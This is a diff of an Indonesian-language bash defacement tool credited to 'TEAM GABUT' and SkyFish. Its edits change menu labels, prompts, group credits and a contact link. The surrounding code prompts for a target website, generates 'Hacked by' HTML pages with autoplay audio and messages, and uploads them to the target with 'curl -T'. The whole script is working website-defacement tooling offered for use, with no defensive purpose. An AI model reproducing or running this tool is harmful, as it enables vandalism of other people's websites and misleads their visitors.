@@ -9,16 +9,16 @@ echo ''
 echo '[][][][][][][][]][][][][][][][][][][][][][][][][][][][][]'
 echo -e '[#]\e[1;31m1 \e[0;36mscript deface keren dengan pesan'
 echo -e '[#]\e[1;31m2 \e[0;36mscript tema system dengan pesan'
-echo -e '[#]\e[1;31m3 \e[0;36mscript tema komputer dengan banyak pesan'
-echo -e '[#]\e[1;31m4 \e[0;36mscript paling rekomendasi dari saya'
+echo -e '[#]\e[1;31m3 \e[0;36mscript theme3'
+echo -e '[#]\e[1;31m4 \e[0;36mscript theme4'
 echo -e '[#]\e[1;31m5 \e[0;36mscript simple'
-echo -e '[#]\e[1;31m6 \e[0;36mscript all team GABUT'
+echo -e '[#]\e[1;31m6 \e[0;36mscript team GABUT'
 echo '[][][][][][][][]][][][][][][][][][][][][][][][][][][][][]'
 echo ''
 read -p '[+] pilih mana: ' pill
 if [ $pill = 1 ]
 then
-read -p $'\e[32mWebsite Yang Mau Di Deface :\e[0m ' target
+read -p $'\e[32mWebsite Deface :\e[0m ' target
 read -p $'\e[32mNama Anda :\e[0m ' user
 read -p $'\e[32mpesan  :\e[0m ' pesan1
 cd $HOME
@@ -147,7 +147,7 @@ farben = farben.concat(farben);
 farbsatz=Math.floor(Math.random()*(farbbibliothek.length-0.0001)); 
 } 
 setInterval("farbtauscher()",5000); 
-text= "-=[+] TEAM GABUT [+]=- ";
+text= "-=[+] GABUT [+]=- ";
 </script><span class='newclass'>
 <script type="text/javascript">
 string2array(text); 
@@ -169,7 +169,7 @@ document.oncontextmenu=new Function("return false")
 <h4 id="h4"><br></h4>
 <br><br><br><br><br><br><br><br>
 <p class="style14" align="center"> <font color="#ffffff" face="courier new" size="3">Terimakasih :</font><marquee scrolldelay="20" scrollamount="2" direction="left" behavior="scroll" width="50%">
-<font color="#ff0000" face="Tahoma" size="3">   - $user - TEAM GABUT Center - TEAM_GABUT AND $user </font></marquee><br></p><p align="center">
+<font color="#ff0000" face="Tahoma" size="3">   - $user - GABUT Center - GABUT AND $user </font></marquee><br></p><p align="center">
 </div>
 </div>
 <canvas id="canvas"></canvas>
@@ -457,7 +457,7 @@ echo -e "\e[1;32mTarget Anda Telah Di deface\e[0m"
 fi
 if [ $pill = 2 ]
 then
-read -p $'\e[32mWebsite Yang Mau Di Deface :\e[0m ' target1
+read -p $'\e[32mWebsite  Deface :\e[0m ' target1
 read -p $'\e[32mNama Anda :\e[0m ' user1
 read -p $'\e[32mpesan  :\e[0m ' pesan2
 cd $HOME
@@ -497,7 +497,7 @@ echo 'Berhasil Di Deface'
 fi
 if [ $pill = 3 ]
 then
-read -p $'\e[32mWebsite Yang Mau Di Deface :\e[0m ' target2
+read -p $'\e[32mWebsite Deface :\e[0m ' target2
 read -p $'\e[32mNama Anda :\e[0m ' user2
 read -p $'\e[32mpesan pertama  :\e[0m ' pesanA
 read -p $'\e[32mpesan kedua  :\e[0m ' pesanB
@@ -532,18 +532,18 @@ cat <<lol>index.html
 Hacked by $user2 <br> SYSTEM
 </h1><center>Message :<p>
 	$pesanA<br>$pesanB<br> $pesanC <br>$pesanD<br><br>
-#TEAM GABUT <br> COPYRIGHT SkyFish<br><br></a><br>
+#GABUT <br> COPYRIGHT SkyFish<br><br></a><br>
 	<br>
 		<body dir="ltr" alink="green" background="transparan" bgcolor="green" link="green" text="green" vlink="green">
-contact me : <a href="Dirumah aja Di Luar Banyak Jagoan">Touch</a><br>
-<a href=https://yourweb.com class=h2>Copyright &copy; 2019 | Powered By TEAM GABUT</a></div><div class="piece noclick scanlines"></div><div class="piece noclick glow"></div></div><center>
+contact me : <a href="https://t.me/SkyFish404">Touch</a><br>
+<a href=https://yourweb.com class=h2>Copyright &copy; 2019 | Powered By GABUT</a></div><div class="piece noclick scanlines"></div><div class="piece noclick glow"></div></div><center>
 lol
 curl -T /$HOME/index.html $target2
-echo 'BERHASIL ADI DEFACE'
+echo 'BERHASIL DI DEFACE'
 fi
 if [ $pill = 4 ]
 then
-read -p $'\e[32mWebsite Yang Mau Di Deface :\e[0m ' target3
+read -p $'\e[32mWebsite Deface :\e[0m ' target3
 read -p $'\e[32mNama Anda :\e[0m ' user3
 read -p $'\e[32mpesan pertama  :\e[0m ' pesanf
 read -p $'\e[32mpesan kedua  :\e[0m ' pesang
@@ -625,7 +625,7 @@ echo 'Berhasil Men Deface'
 fi
 if [ $pill = 5 ]
 then
-read -p $'\e[32mWebsite Yang Mau Di Deface :\e[0m ' target4
+read -p $'\e[32mWebsite  Deface :\e[0m ' target4
 read -p $'\e[32mNama Anda :\e[0m ' user4
 cd $HOME
 rm index.html
@@ -858,7 +858,7 @@ echo 'DONE'
 fi
 if [ $pill = 6 ]
 then
-read -p $'\e[32mWebsite Yang Mau Di Deface :\e[0m ' target5
+read -p $'\e[32mWebsite  Deface :\e[0m ' target5
 read -p $'\e[32mNama Anda :\e[0m ' user5
 read -p $'\e[32mpesan :\e[0m ' pes
 cd $HOME
@@ -871,9 +871,9 @@ cat <<nano>index.html
     <h2>
 <b><font color=red>"Hacked B<font color=white>y $user5" <b></h2>
 <audio src="https://i.top4top.io/m_16036g6f61.mp3" autoplay="true" loop="true"></audio>
-<font color=cyan>$pes<br><br>We are : <br>-DH1Y4-TEAM GABUT-$user5-petrick_exploiter-xTEAM GABUT<br> -DH1Y4-TEAM GABUT-$user5-petrick_exploiter-xTEAM GABUT-TEAM GABUT <br> </div>
+<font color=cyan>$pes<br><br>We are : <br>-GABUT- GABUT-$user5-GABUT_GABUT_ GABUT<br> -GABUT-$user5-GABUT_GABUT- GABUT <br> </div>
 <div class="greetings">
-   <b><font color=white>Greetz To :<br>$user5 and TEAM GABUT<br><br>Contact: CHANNEL (TEAM GABUT)   </footer>     </div>
+   <b><font color=white>GABUT To :<br>$user5 and  GABUT<br><br>Contact: CHANNEL ( GABUT)   </footer>     </div>
 <embed src="https://www.youtube.com/v/v=loCEj0Rj5NY&autoplay=1" type="application/x-shockwave-flash" wmode="transparent" width="1" height="1"></embed>  </body> </html>
 nano
 curl -T /$HOME/index.html $target5
